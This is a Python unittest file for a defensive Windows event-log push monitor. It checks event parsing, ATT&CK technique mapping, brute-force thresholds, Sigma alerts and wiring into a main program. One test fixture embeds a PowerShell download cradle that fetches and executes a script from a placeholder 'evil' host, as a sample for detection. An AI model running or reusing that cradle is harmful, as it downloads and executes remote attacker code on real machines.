"""Tests for v29.48: event_push_monitor (EvtSubscribe push telemetry) +
main-file wiring."""
import importlib
import os
import sys
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

event_push_monitor = importlib.import_module('event_push_monitor')

XML_7045 = ("<Event><System><Provider Name='Service Control Manager'/>"
            "<EventID>7045</EventID><Channel>System</Channel></System>"
            "<EventData><Data Name='ServiceName'>EvilSvc</Data>"
            "</EventData></Event>")
XML_1102 = ("<Event><System><EventID>1102</EventID></System></Event>")
XML_4625 = ("<Event><System><EventID>4625</EventID></System><EventData>"
            "<Data Name='SubjectUserName'>evil</Data></EventData></Event>")
XML_4104 = ("<Event><System><EventID>4104</EventID></System><EventData>"
            "<Data Name='ScriptBlockText'>IEX (New-Object Net.WebClient)."
            "DownloadString('http://evil/x.ps1')</Data></EventData></Event>")
XML_4688 = "<Event><System><EventID>4688</EventID></System></Event>"


class TestEventPushMonitor(unittest.TestCase):
    def setUp(self):
        self.alerts = []
        self.mon = event_push_monitor.EventPushMonitor(self.alerts.append)

    def test_parse_event_id(self):
        self.assertEqual(event_push_monitor.parse_event_id(XML_7045), 7045)
        self.assertIsNone(event_push_monitor.parse_event_id('garbage'))
        self.assertIsNone(event_push_monitor.parse_event_id(''))

    def test_extract_script_block(self):
        text = event_push_monitor.extract_script_block(XML_4104)
        self.assertIn('DownloadString', text)
        self.assertEqual(event_push_monitor.extract_script_block(
            XML_7045), '')

    def test_handle_event_maps_alert(self):
        self.mon._handle_event(7045, XML_7045)
        self.assertEqual(len(self.alerts), 1)
        a = self.alerts[0]
        self.assertEqual(a.event_id, 7045)
        self.assertEqual(a.technique, 'T1543.003')
        self.assertEqual(a.severity, 'HIGH')
        self.assertEqual(self.mon.alerts_emitted, 1)

    def test_log_clear_is_critical(self):
        self.mon._handle_event(1102, XML_1102)
        self.assertEqual(self.alerts[0].severity, 'CRITICAL')
        self.assertEqual(self.alerts[0].technique, 'T1070.001')

    def test_ignored_event_ids_are_silent(self):
        self.mon._handle_event(9999, "<Event><System><EventID>9999</EventID>"
                                      "</System></Event>")  # unwatched ID
        self.assertEqual(self.alerts, [])

    def test_4625_burst_threshold(self):
        # single failures are too noisy — no alert until threshold
        for _ in range(event_push_monitor.BRUTE_FORCE_THRESHOLD - 1):
            self.mon._handle_event(4625, XML_4625)
        self.assertEqual(self.alerts, [])
        self.mon._handle_event(4625, XML_4625)
        self.assertEqual(len(self.alerts), 1)
        a = self.alerts[0]
        self.assertEqual(a.technique, 'T1110')
        self.assertEqual(a.severity, 'HIGH')
        self.assertIn('failed logons', a.detail)

    def test_4104_sigma_bridge(self):
        self.mon._handle_event(4104, XML_4104)
        descriptions = [a.description for a in self.alerts]
        # the informational 4104 plus a Sigma cradle hit
        self.assertTrue(any('script block' in d.lower()
                            for d in descriptions))
        self.assertTrue(any('[SIGMA]' in d for d in descriptions))
        sigma_alert = next(a for a in self.alerts
                           if '[SIGMA]' in a.description)
        self.assertEqual(sigma_alert.severity, 'HIGH')
        self.assertEqual(sigma_alert.technique, 'T1059.001')

    def test_callback_exception_is_contained(self):
        def bad_callback(_alert):
            raise RuntimeError('boom')
        self.mon.callback = bad_callback
        try:
            self.mon._handle_event(7045, XML_7045)
        except RuntimeError:
            self.fail('callback exception leaked into the event thread')
        self.assertEqual(self.mon.alerts_emitted, 1)

    def test_start_push_returns_coverage(self):
        if not event_push_monitor._EVT_AVAILABLE:
            self.skipTest('win32evtlog unavailable')
        st = self.mon.start_push()
        self.assertIn('covered', st)
        self.assertIn('failed', st)
        self.assertTrue(st['covered'])       # System + PowerShell at least
        self.assertTrue(self.mon.is_running())
        # idempotent second call reports the same coverage
        st2 = self.mon.start_push()
        self.assertEqual(sorted(st2['covered']), sorted(st['covered']))
        self.mon.stop()
        self.assertFalse(self.mon.is_running())

    def test_start_push_without_evtlib(self):
        with mock.patch.object(event_push_monitor, '_EVT_AVAILABLE', False):
            st = event_push_monitor.EventPushMonitor().start_push()
        self.assertEqual(st['covered'], [])
        self.assertTrue(st['failed'])


class TestV2948Wiring(unittest.TestCase):
    """Source-structure tests — main file read as text, never imported."""
    MAIN = os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        'downpour_v29_titanium.py')

    @classmethod
    def setUpClass(cls):
        with open(cls.MAIN, encoding='utf-8', errors='replace') as f:
            cls.src = f.read()

    def test_push_wired(self):
        self.assertIn('import event_push_monitor', self.src)
        self.assertIn('EVENT_PUSH_AVAILABLE', self.src)
        self.assertIn('_event_push_alert_bridge', self.src)
        self.assertIn('[EVT-PUSH]', self.src)
        self.assertIn('_event_push_started', self.src)
        self.assertIn('start_push(', self.src)

    def test_poll_fallback_preserved(self):
        # the v29.44b poll monitor must still start (fallback for channels
        # push could not cover)
        self.assertIn('_poll_mon.start(interval=15.0)', self.src)
        self.assertIn('_event_log_alert_bridge', self.src)

    def test_no_duplicate_alerting(self):
        # covered channels must be dropped from the poll monitor bookmarks
        self.assertIn('_poll_mon._bookmarks.pop(_ch, None)', self.src)


if __name__ == '__main__':
    unittest.main()
